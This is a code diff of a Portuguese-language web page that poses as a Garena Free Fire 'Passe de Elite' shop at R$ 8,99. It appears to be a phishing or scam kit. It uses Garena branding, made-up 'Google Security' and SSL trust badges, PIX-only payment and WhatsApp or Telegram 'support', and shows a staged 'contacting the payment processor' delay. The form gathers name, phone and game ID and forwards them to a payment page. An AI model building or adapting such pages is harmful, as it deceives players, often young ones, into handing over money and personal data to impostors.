@@ -3,24 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Compre já seu Passe de Elite por apenas R$ 8,99!">
-    <title>Passe de Elite - R$ 8,99</title>
+    <title>Recarga Free Fire Online</title>
     <link rel="icon" type="image/png" href="favicon.png">
     <style>
         body {
             margin: 0;
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            background-color: #f5f5f5;
+            position: relative;
         }
         header {
             background-color: #000;
-            padding: 10px;
+            color: #fff;
             display: flex;
-            align-items: center;
             justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            height: 60px;
         }
         header img {
-            max-height: 30px;
+            height: 30px;
+        }
+        .microphone {
+            height: 35px;
+            cursor: pointer;
+        }
+        main {
+            padding: 20px;
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+            font-weight: bold;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            max-width: 400px;
+            gap: 15px;
+        }
+        .field-container {
+            position: relative;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: #fff;
+            box-sizing: border-box;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        .input-field:focus {
+            border-color: #007bff;
+            box-shadow: 0 0 8px #007bff;
+        }
+        .field-status {
+            position: absolute;
+            top: 50%;
+            left: -15px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: red;
+            transform: translateY(-50%);
+            transition: background-color 0.3s;
+        }
+        .hint {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+        .submit-button {
+            padding: 12px;
+            font-size: 18px;
+            color: #fff;
+            background-color: #000;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: center;
+            transition: background-color 0.3s;
+        }
+        .submit-button:hover {
+            background-color: #333;
+        }
+        .link {
+            font-size: 12px;
+            color: #007bff;
+            text-decoration: none;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+        .info-text {
+            font-size: 16px;
+            color: #333;
+            margin-top: 20px;
+        }
+        .info-highlight {
+            color: #007bff;
+            font-weight: bold;
+        }
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .loading-circle {
+            width: 50px;
+            height: 50px;
+            border: 5px solid transparent;
+            border-top: 5px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            margin-top: 20px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            animation: blink 1s steps(2, start) infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
         }
     </style>
 </head>
@@ -28,8 +149,186 @@
     <header>
         <img src="1.png" alt="Logo">
         <a href="suporte.html">
-            <img src="suporte.png" alt="Suporte" class="support-icon">
+            <img src="ta.png" alt="Microfone" class="microphone">
         </a>
     </header>
+
+    <main>
+        <h2>Preencha os campos abaixo para finalizar a compra:</h2>
+        <form onsubmit="handleSubmit(event)">
+            <div class="field-container">
+                <div class="field-status" id="name-status"></div>
+                <input type="text" class="input-field" id="name" placeholder="Nome" oninput="validateName()" required>
+                <p class="hint">Exemplo: João Silva</p>
+            </div>
+
+            <div class="field-container">
+                <div class="field-status" id="phone-status"></div>
+                <input type="tel" class="input-field" id="phone" placeholder="Número de Telefone" maxlength="15" oninput="formatPhone()" required>
+                <p class="hint">Exemplo: (11) 91234-5678</p>
+            </div>
+
+            <div class="field-container">
+                <div class="field-status" id="id-status"></div>
+                <input type="number" class="input-field" id="freefire-id" placeholder="ID do Free Fire" oninput="validateID()" required>
+                <p class="hint">Exemplo: 123456</p>
+                <p class="hint"><a href="id.html" class="link">Não sei meu ID, clique aqui</a></p>
+            </div>
+
+            <button type="submit" class="submit-button" id="submit-button">Finalizar Compra</button>
+        </form>
+
+        <p class="info-text">
+            <span class="info-highlight">Segurança:</span> Todas as transações são realizadas de forma segura.
+        </p>
+        <p class="info-text">
+            <span class="info-highlight">Formas de pagamento:</span> Pagamento disponível via PIX.
+        </p>
+        <p class="info-text">
+            <span class="info-highlight">Suporte:</span> Atendimento online 24 horas via WhatsApp.
+        </p>
+    </main>
+
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="loading-circle"></div>
+        <div class="loading-text">Entrando em contato com a processadora de pagamentos...</div>
+    </div>
+
+    <script>
+        function validateName() {
+            const nameField = document.getElementById("name");
+            const status = document.getElementById("name-status");
+            if (nameField.value.trim().length > 5) {
+                status.style.backgroundColor = "green";
+            } else {
+                status.style.backgroundColor = "red";
+            }
+        }
+
+        function formatPhone() {
+            const phoneField = document.getElementById("phone");
+            const status = document.getElementById("phone-status");
+            let value = phoneField.value.replace(/\D/g, ""); // Remove non-numeric characters
+            if (value.length <= 11) {
+                phoneField.value = value.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
+            }
+            if (value.length === 11) {
+                status.style.backgroundColor = "green";
+            } else {
+                status.style.backgroundColor = "red";
+            }
+        }
+
+        function validateID() {
+            const idField = document.getElementById("freefire-id");
+            const status = document.getElementById("id-status");
+            if (idField.value.trim().length >= 6) {
+                status.style.backgroundColor = "green";
+            } else {
+                status.style.backgroundColor = "red";
+            }
+        }
+
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            const nameStatus = document.getElementById("name-status").style.backgroundColor;
+            const phoneStatus = document.getElementById("phone-status").style.backgroundColor;
+            const idStatus = document.getElementById("id-status").style.backgroundColor;
+            const button = document.getElementById("submit-button");
+            const loadingOverlay = document.getElementById("loading-overlay");
+
+            if (nameStatus !== "green" || phoneStatus !== "green" || idStatus !== "green") {
+                alert("Preencha todos os campos corretamente.");
+                return;
+            }
+
+            button.textContent = "Processando...";
+            loadingOverlay.style.display = "flex";
+
+            setTimeout(() => {
+                const name = document.getElementById("name").value.trim();
+                const phone = document.getElementById("phone").value.trim();
+                const freeFireID = document.getElementById("freefire-id").value.trim();
+                window.location.href = `p.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&id=${encodeURIComponent(freeFireID)}`;
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
+
+
+
+
+
+
+<footer style="background-color: #000; color: #fff; padding: 20px; text-align: center;">
+    <!-- Logo da Garena -->
+    <img src="Garena.png" alt="Garena Logo" style="max-width: 120px; margin-bottom: 20px;">
+    
+    <!-- Texto explicativo sobre segurança -->
+    <div style="font-size: 16px; margin-bottom: 10px;">
+        Segurança da Garena e segurança na entrega dos passes de elite
+    </div>
+
+    <!-- Seção explicativa sobre o Passe de Elite -->
+    <div style="font-size: 16px; margin-bottom: 20px;">
+        <strong>O que é o Passe de Elite?</strong><br>
+        O Passe de Elite é um item premium no Free Fire que oferece várias recompensas exclusivas durante o período de sua ativação. Ele é uma excelente forma de garantir benefícios extras no jogo, como skins e outros itens exclusivos, e é enviado diretamente após a confirmação do pagamento.
+    </div>
+    
+    <!-- Seção de imagens de segurança com largura aumentada -->
+    <div style="display: flex; justify-content: center; gap: 30px; margin-bottom: 10px;">
+        <img src="google-security.png" alt="Google Security" style="max-width: 100px; height: auto;">
+        <img src="certificado-ssl.png" alt="Certificado SSL" style="max-width: 100px; height: auto;">
+    </div>
+    
+    <!-- Texto final sobre segurança -->
+    <div style="font-size: 16px; margin-bottom: 20px;">
+        A sua segurança é nossa prioridade! Todos os pagamentos são realizados através de plataformas seguras e confiáveis, com tecnologia de criptografia para proteger suas informações pessoais e financeiras.
+    </div>
+    
+    <!-- Texto sobre a Garena e Free Fire -->
+    <div style="font-size: 16px; margin-bottom: 20px;">
+        <strong>Sobre a Garena Free Fire:</strong><br>
+        Garena Free Fire é um dos jogos de battle royale mais populares, com milhões de jogadores em todo o mundo. A Garena é uma empresa comprometida com a segurança de seus usuários e oferece diversos métodos de proteção para garantir uma experiência segura e divertida.
+    </div>
+    
+    <!-- Direitos autorais -->
+    <div style="font-size: 14px; margin-top: 20px;">
+        &copy; Desde 2011 - <span id="current-year"></span>
+    </div>
+</footer>
+
+<script>
+    // Exibe o ano atual dinamicamente
+    document.getElementById('current-year').textContent = new Date().getFullYear();
+</script>
+
+
+
+
+
+
+
+<div style="position: fixed; bottom: 20px; right: 20px; z-index: 1000; animation: bounce 1.5s infinite;">
+    <a href="suporte.html" target="_blank" style="text-decoration: none;">
+        <img src="ta.png" alt="Contato no Telegram" style="width: 50px; height: 50px; border-radius: 50%; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);">
+    </a>
+</div>
+
+<style>
+@keyframes bounce {
+    0%, 100% {
+        transform: translateY(0);
+    }
+    50% {
+        transform: translateY(-10px);
+    }
+}
+</style>
+
+
+
+
+
